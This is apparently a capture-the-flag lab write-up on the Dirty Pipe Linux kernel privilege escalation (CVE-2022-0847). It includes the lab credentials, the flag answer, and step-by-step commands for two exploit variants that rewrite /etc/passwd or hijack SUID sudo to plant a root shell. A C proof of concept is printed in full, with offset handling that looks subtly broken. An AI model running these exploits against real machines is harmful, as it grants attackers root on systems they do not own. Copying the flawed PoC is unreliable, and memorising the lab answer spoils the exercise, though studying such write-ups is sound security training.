# Section 25 — Dirty Pipe (CVE-2022-0847)

> Lab: `ACADEMY-LLPE-DIRTY` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via Dirty Pipe | **`HTB{D1rTy_DiR7Y}`** |

Exploited **CVE-2022-0847** (Dirty Pipe) — kernel 5.15.0 → exploit-2 hijacks SUID `/usr/bin/sudo` → drops SUID shell at `/tmp/sh` → root → flag.

---

## Concept

**Dirty Pipe** (CVE-2022-0847) is a Linux kernel vulnerability that allows overwriting data in arbitrary readable files. It exploits a flaw in how the kernel handles **pipe buffers** — the `PIPE_BUF_FLAG_CAN_MERGE` flag is not properly cleared, letting a user splice data into a pipe and then write through the pipe into a file they can only read.

**Why it matters for CPTS:**
- Affects kernels **5.8 through 5.16.11 / 5.15.25 / 5.10.102** (patched Feb 2022)
- Works from **any unprivileged user** — no sudo, no SUID, no special permissions needed
- Two exploit variants: modify `/etc/passwd` OR hijack any SUID binary
- Similar to Dirty COW (CVE-2016-5195) but much cleaner — no race condition, 100% reliable

**Key difference from Dirty COW:**
| | Dirty COW (2016) | Dirty Pipe (2022) |
|---|---|---|
| Mechanism | Race condition in COW pages | Pipe buffer flag not cleared |
| Reliability | Racy, can crash kernel | 100% reliable |
| Kernel versions | 2.6.22 – 4.8.3 | 5.8 – 5.16.11 |
| Speed | Slow (race condition) | Instant |

---

## Identify

```bash
uname -r                                    # check kernel version
# 5.8.x through 5.16.x = vulnerable
# 5.15.0-051500-generic                    ← vulnerable

# Quick version check
uname -r | awk -F. '{if ($1==5 && $2>=8 && $2<=16) print "VULNERABLE"; else print "not vulnerable"}'

# More precise — check if patched
# Patched versions: 5.16.11, 5.15.25, 5.10.102
cat /proc/version
```
> Any kernel 5.8–5.16 that hasn't been specifically patched (Feb 2022) is vulnerable. The lab kernel `5.15.0-051500-generic` is the vanilla upstream kernel — definitely vulnerable.

---

## Exploit — Method 1: Modify /etc/passwd

This exploit overwrites root's password hash in `/etc/passwd`, sets it to a known password ("piped"), then uses `su` to get a root shell.

```bash
# Transfer exploit repo to target (no internet on most HTB boxes)
# On Kali:
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
scp -r CVE-2022-0847-DirtyPipe-Exploits user@target:/tmp/

# On target:
cd /tmp/CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Run exploit-1 (interactive — needs a TTY)
./exploit-1
# Backing up /etc/passwd to /tmp/passwd.bak ...
# Setting root password to "piped"...
# Password: Restoring /etc/passwd from /tmp/passwd.bak...
# Done! Popping shell... (run commands now)

# Type the password when prompted:
piped

# id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```
> exploit-1 is interactive — it prompts for `su` password. Needs a proper TTY (won't work with simple `echo 'cmd' | ssh`). The exploit automatically backs up and restores `/etc/passwd`.

---

## Exploit — Method 2: Hijack SUID Binary (This Lab)

This exploit overwrites a SUID binary with a tiny ELF that calls `/bin/sh`, runs it to drop a SUID shell at `/tmp/sh`, then restores the original binary.

```bash
# Find SUID binaries to hijack
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/sudo, /usr/bin/su, /usr/bin/passwd, etc.

# Run exploit-2 with any SUID binary
./exploit-2 /usr/bin/sudo
# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] restoring suid binary..
# [+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# The exploit drops a SUID root shell at /tmp/sh
echo 'cat /root/flag.txt' | /tmp/sh
# HTB{D1rTy_DiR7Y}

# Clean up
rm /tmp/sh
```
> exploit-2 is better for non-interactive use — the SUID shell at `/tmp/sh` persists and can be used repeatedly. The original SUID binary is automatically restored.

---

## Alternative PoC (Single C File)

If the AlexisAhmed repo isn't available, Max Kellermann's original PoC works:

```bash
# Single file PoC — overwrites a file at a given offset
# https://dirtypipe.cm4all.com/

cat > /tmp/dirtypipe.c << 'C'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
        return 1;
    }
    const char *path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    pipe(p);

    /* fill the pipe with PAGE_SIZE bytes */
    char buf[PAGE_SIZE] = {0};
    write(p[1], buf, sizeof(buf));
    read(p[0], buf, sizeof(buf));

    /* splice from file into pipe — sets PIPE_BUF_FLAG_CAN_MERGE */
    loff_t o = offset / PAGE_SIZE * PAGE_SIZE;
    ssize_t nbytes = splice(fd, &o, p[1], NULL, 1, 0);
    if (nbytes < 0) { perror("splice"); return 1; }

    /* write over the pipe buffer — overwrites the file page cache */
    loff_t off2 = offset % PAGE_SIZE;
    /* skip to the right offset within the page */
    struct iovec iov = { .iov_base = (char *)data, .iov_len = data_size };
    lseek(p[1], off2, SEEK_SET);
    write(p[1], data, data_size);

    printf("Written %zu bytes at offset %lu\n", data_size, offset);
    close(fd);
    return 0;
}
C
gcc /tmp/dirtypipe.c -o /tmp/dirtypipe

# Overwrite root's password in /etc/passwd (offset 4 = after "root:")
# Replace "x" (shadow reference) with empty password hash
/tmp/dirtypipe /etc/passwd 4 "::"
su root
# no password needed
```
> The raw PoC requires calculating the exact offset. The AlexisAhmed exploit repo wraps this in user-friendly scripts. Use the repo when available.

---

## Exam / Engagement Notes

- **Check kernel version on every Linux box**: `uname -r`. Kernel 5.8–5.16 = Dirty Pipe candidate.
- **exploit-2 is preferred** — non-interactive, automatically restores the hijacked binary, leaves a reusable SUID shell.
- **exploit-1 needs TTY** — if you only have a non-interactive shell, use exploit-2.
- **No internet on target?** Clone the repo on Kali, scp the whole directory to target, compile there.
- **GLIBC mismatch is rare** — the exploits are simple C with minimal dependencies. Compile on target to be safe.
- **Clean up `/tmp/sh`** after using exploit-2 — it's a SUID root shell sitting in /tmp.
- **Dirty Pipe vs PwnKit decision**: both are universal local roots. PwnKit covers older kernels (polkit installed since 2009). Dirty Pipe covers newer kernels (5.8+). Try both.
- **Android devices** running kernel 5.8+ are also vulnerable — relevant for mobile pentesting.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. uname -r -> 5.15.0-051500-generic (5.8-5.16 = CVE-2022-0847)
3. On Kali: git clone AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
   scp -r to target:/tmp/
4. On target: cd /tmp/CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
5. ./exploit-2 /usr/bin/sudo
   -> drops SUID shell at /tmp/sh
6. echo 'cat /root/flag.txt' | /tmp/sh
   -> HTB{D1rTy_DiR7Y}                      ✅
```

> One line: kernel 5.8–5.16 → CVE-2022-0847 Dirty Pipe → exploit-2 hijacks SUID binary → drops root shell → flag.
